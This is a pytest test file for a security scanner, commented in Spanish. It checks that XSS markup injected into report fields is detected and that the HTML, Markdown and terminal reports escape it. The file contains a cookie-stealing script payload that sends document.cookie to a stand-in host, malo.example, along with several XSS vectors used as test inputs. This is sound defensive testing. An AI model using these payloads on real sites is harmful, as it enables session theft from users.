"""Aviso, con el detalle de cada fragmento, cuando el repo escaneado intenta colar código en un informe."""

import re
from io import StringIO

import pytest
from rich.console import Console

from secscan.config import Config
from secscan.hostile import MAX_FRAGMENT, MAX_HITS, find_hostile_content
from secscan.models import Category, Finding, HostileHit, ScanResult, Severity
from secscan.report import print_table
from secscan.report_html import to_html
from secscan.report_md import to_markdown
from secscan.runners.base import RunnerOutput
from secscan.scanner import build_result

PAYLOAD = "<script>fetch('https://malo.example/x?c='+document.cookie)</script>"


def finding(**overrides):
    values = dict(
        tool="semgrep", rule_id="rule-a", title="Regla A", severity=Severity.HIGH, category=Category.CODE,
        file="apps/x.py", line_start=1, snippet="urlopen(x)", description="Descripción",
    )  # fmt: skip
    return Finding(**{**values, **overrides})


def detect(findings=(), errors=None, warnings=(), scanned=None):
    return find_hostile_content(findings, errors or {}, warnings, scanned or {})


@pytest.mark.parametrize(
    "text",
    [
        PAYLOAD,
        "<SCRIPT SRC=//malo.example/x.js>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        '<iframe src="//malo.example">',
        "<a href='javascript:alert(1)'>x</a>",
        "data:text/html,<b>x</b>",
    ],
)
def test_detects_markup_that_would_run_code_in_any_untrusted_field(text):
    for field in ("file", "rule_id", "title", "description"):
        assert detect([finding(**{field: text})])[1], f"no detectado en {field}: {text}"
    assert detect(errors={"trivy": text})[1]
    assert detect(warnings=[text])[1]
    assert detect(scanned={"semgrep": [text]})[1]


@pytest.mark.parametrize(
    "text",
    [
        "Detected the use of eval(). eval() can be dangerous",
        "src/utils/helpers.py",
        "x < y and y > z",
        "Uso de la variable online = True",
        "Image user should not be 'root'",
        "Add 'USER <non root user name>' line to the Dockerfile",  # lo que dice Trivy de verdad
    ],
)
def test_normal_text_does_not_raise_an_alert(text):
    assert detect([finding(title=text, description=text, file=text)]) == ([], [])


def test_snippets_are_not_checked_because_html_templates_are_legitimate_code():
    assert detect([finding(snippet='<script src="/static/app.js"></script>')]) == ([], [])


class TestFragments:
    """Cada coincidencia indica dónde está, en qué campo, qué tipo es y el fragmento exacto."""

    def hits(self, **overrides):
        return detect([finding(**overrides)])[1]

    def test_reports_where_field_kind_and_the_exact_tag(self):
        [hit] = self.hits(rule_id="mala", title="<img src=x onerror=alert(1)>")

        assert hit.where == "semgrep/mala" and hit.field == "título"
        assert "manejador de eventos" in hit.kind
        assert hit.fragment == "<img src=x onerror=alert(1)>"  # la etiqueta completa, para poder juzgarla

    def test_the_tag_is_cut_at_its_closing_bracket_not_the_whole_field(self):
        fragments = {hit.fragment for hit in self.hits(title="Texto largo antes " + PAYLOAD + " y después")}

        # Apertura y cierre, sin el texto de alrededor ni el código que hay entre las etiquetas.
        assert fragments == {"<script>", "</script>"}

    def test_javascript_urls_show_the_tag_that_carries_them(self):
        [hit] = self.hits(description="ver <a href='javascript:alert(1)'>aquí</a>")

        assert hit.fragment == "<a href='javascript:alert(1)'>" and "javascript" in hit.kind

    def test_fields_are_named(self):
        fields = {h.field for h in detect([finding(file="<img src=x onerror=1>", rule_id="<svg onload=1>", description="<iframe src=x>")])[1]}
        assert fields == {"ruta", "regla", "descripción"}

    def test_long_fragments_are_truncated(self):
        [hit] = self.hits(title="<img " + "a" * 500 + " onerror=1>")
        assert len(hit.fragment) <= MAX_FRAGMENT

    def test_the_same_fragment_is_not_listed_twice_in_one_field(self):
        hits = self.hits(title="<img src=x onerror=1> y otra vez <img src=x onerror=1>")
        assert len(hits) == 1

    def test_the_headline_counts_and_invites_review(self):
        [alert], hits = detect([finding(title=PAYLOAD)])

        assert f"{len(hits)} coincidencia(s)" in alert and "falso positivo" in alert and "no confiable" in alert

    def test_only_a_limited_number_of_hits_is_detailed(self):
        from secscan.report import shown_hits

        many = ScanResult(target="x", hostile_hits=[HostileHit(where=f"r{i}", field="título", kind="k", fragment="<img onerror=1>") for i in range(MAX_HITS + 5)])
        shown, more = shown_hits(many)

        assert len(shown) == MAX_HITS and more == 5


def test_scanner_adds_the_alert_only_for_what_will_be_shown(tmp_path):
    hostile = finding(title=PAYLOAD)
    ignored = finding(title=PAYLOAD, file="tests/t.py")
    config = Config.model_validate({"ignore": {"paths": ["tests/**"]}})

    shown = build_result(tmp_path, {"semgrep": RunnerOutput(findings=[hostile])}, {}, config)
    hidden = build_result(tmp_path, {"semgrep": RunnerOutput(findings=[ignored])}, {}, config)

    assert len(shown.alerts) == 1 and shown.hostile_hits
    assert hidden.alerts == [] and hidden.hostile_hits == []  # ignorado: no aparece en el informe


class TestEveryOutputListsTheFragments:
    TAG = "<img src=x onerror=alert(1)>"

    def result(self):
        findings = [finding(title=self.TAG, rule_id="mala")]
        alerts, hits = detect(findings)
        return ScanResult(target="/x/repo", findings=findings, alerts=alerts, hostile_hits=hits)

    def test_html_lists_each_fragment_escaped_inside_code_and_stays_inert(self):
        html = to_html(self.result())

        assert "Fragmentos a revisar (1)" in html
        assert "<code>&lt;img src=x onerror=alert(1)&gt;</code>" in html
        assert not re.search(r"<img\b", html) and "<script" not in html
        assert html.index("Fragmentos a revisar") < html.index("Hallazgos</h2>")

    def test_markdown_has_a_table_of_fragments_escaped(self):
        md = to_markdown(self.result())

        assert "### Fragmentos a revisar" in md and "| Dónde | Campo | Tipo | Fragmento |" in md
        assert "&lt;img src=x onerror=alert\\(1\\)\\>" in md  # visible pero sin interpretarse
        assert "<img" not in md

    def test_terminal_table_shows_the_fragment_literally(self):
        buffer = StringIO()
        print_table(self.result(), Console(file=buffer, width=200, force_terminal=False))
        out = buffer.getvalue()

        assert "ALERTA" in out and "Fragmentos a revisar" in out
        assert self.TAG in out  # literal, no como marcado de Rich
        assert "semgrep/mala" in out and "título" in out

    def test_a_clean_result_has_no_alert_or_fragments_anywhere(self):
        clean = ScanResult(target="x", findings=[finding()])
        assert "Fragmentos a revisar" not in to_html(clean) + to_markdown(clean)

    def test_overflow_is_announced(self):
        hits = [HostileHit(where=f"r{i}", field="título", kind="k", fragment="<b onclick=1>") for i in range(MAX_HITS + 3)]
        result = ScanResult(target="x", alerts=["a"], hostile_hits=hits)

        assert "y 3 más" in to_html(result) and "y 3 más" in to_markdown(result)
